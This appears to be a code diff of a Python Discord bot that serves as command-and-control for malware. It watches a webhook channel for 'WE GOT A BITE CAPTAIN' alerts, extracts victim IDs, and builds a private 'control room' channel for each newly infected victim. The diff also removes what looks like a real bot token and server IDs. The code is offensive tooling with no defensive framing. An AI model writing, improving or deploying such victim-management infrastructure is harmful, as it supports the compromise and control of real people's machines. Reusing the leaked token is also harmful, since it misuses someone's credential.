@@ -181,40 +181,74 @@ print(f"EXE ready: dist\\{output_name}")
 import discord
 import re
 
-TOKEN = "MTQ1MzQ4Njg3ODk3MDg3MTk3Mg.GNf9Mg.mhHpluLYh-FZN5lKmtbMMSrP0ZvMgZtJQFa1HQ"
-GUILD_ID = 1264299849063333919  # Server ID
-LOG_CHANNEL_ID = 1278004169134837770  # Channel where webhook posts
+TOKEN = "YOUR_BOT_TOKEN_HERE"
+GUILD_ID = 123456789012345678  # Your server ID
+LOG_CHANNEL_ID = 987654321098765432  # Webhook channel ID
 
 intents = discord.Intents.default()
-intents.message_content = True
-bot = discord.Bot(intents=intents)
+intents.message_content = True  # Needed to read embed descriptions
 
-known = set()
+bot = discord.Bot(intents=intents)  # <--- Fixed: capital B, correct class
 
-async def make_victim_section(vid):
+known_victims = set()
+
+async def create_victim_section(victim_id):
     guild = bot.get_guild(GUILD_ID)
-    cat = await guild.create_category(f"Victim-{vid}")
-    channel = await cat.create_text_channel(f"logs-{vid}", overwrites={
-        guild.default_role: discord.PermissionOverwrite(read_messages=False),
-        guild.me: discord.PermissionOverwrite(read_messages=True)
-    })
+    if not guild:
+        print("Error: Guild not found - wrong GUILD_ID?")
+        return None
+    
+    category_name = f"Victim-{victim_id}"
+    category = discord.utils.get(guild.categories, name=category_name)
+    if not category:
+        category = await guild.create_category(category_name)
+        print(f"Created category: {category_name}")
+    
+    channel_name = f"logs-{victim_id}"
+    channel = discord.utils.get(category.text_channels, name=channel_name)
+    if not channel:
+        overwrites = {
+            guild.default_role: discord.PermissionOverwrite(read_messages=False),
+            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True, manage_messages=True)
+        }
+        channel = await category.create_text_channel(channel_name, overwrites=overwrites)
+        print(f"Created private channel: {channel_name}")
+    
     return channel
 
 @bot.event
 async def on_ready():
-    print("Bot watching for bites...")
+    print(f"{bot.user} is online and hunting bites in guild {GUILD_ID}")
 
 @bot.event
-async def on_message(msg):
-    if msg.channel.id != LOG_CHANNEL_ID or msg.author.bot:
+async def on_message(message):
+    if message.channel.id != LOG_CHANNEL_ID:
         return
-    content = msg.content + "".join([e.description or "" for e in msg.embeds])
-    if "WE GOT A BITE CAPTAIN" in content:
-        match = re.search(r"Victim ID[:\\s]+([a-f0-9]{{8}})", content, re.I) or re.search(r"\[([a-f0-9]{{8}})\]", content)
-        if match and match.group(1) not in known:
-            vid = match.group(1)
-            known.add(vid)
-            channel = await make_victim_section(vid)
-            await msg.reply(f"New victim **{vid}** online! Control room: {channel.mention}")
+    if not message.embeds and not message.content:
+        return
+    
+    # Combine content + embed descriptions for parsing
+    full_text = message.content
+    for embed in message.embeds:
+        if embed.description:
+            full_text += " " + embed.description
+        if embed.title:
+            full_text += " " + embed.title
+    
+    if "WE GOT A BITE CAPTAIN" not in full_text:
+        return
+    
+    # Better regex: catches [abc12345] or Victim ID: abc12345
+    match = re.search(r"\[([a-f0-9]{8})\]|Victim ID.*?([a-f0-9]{8})", full_text, re.IGNORECASE)
+    if match:
+        victim_id = match.group(1) or match.group(2)
+        if victim_id in known_victims:
+            return
+        known_victims.add(victim_id)
+        print(f"New victim detected: {victim_id}")
+        
+        channel = await create_victim_section(victim_id)
+        if channel:
+            await message.reply(f"**Fresh meat online** — Victim **{victim_id}**\nControl room ready: {channel.mention}")
 
 bot.run(TOKEN)
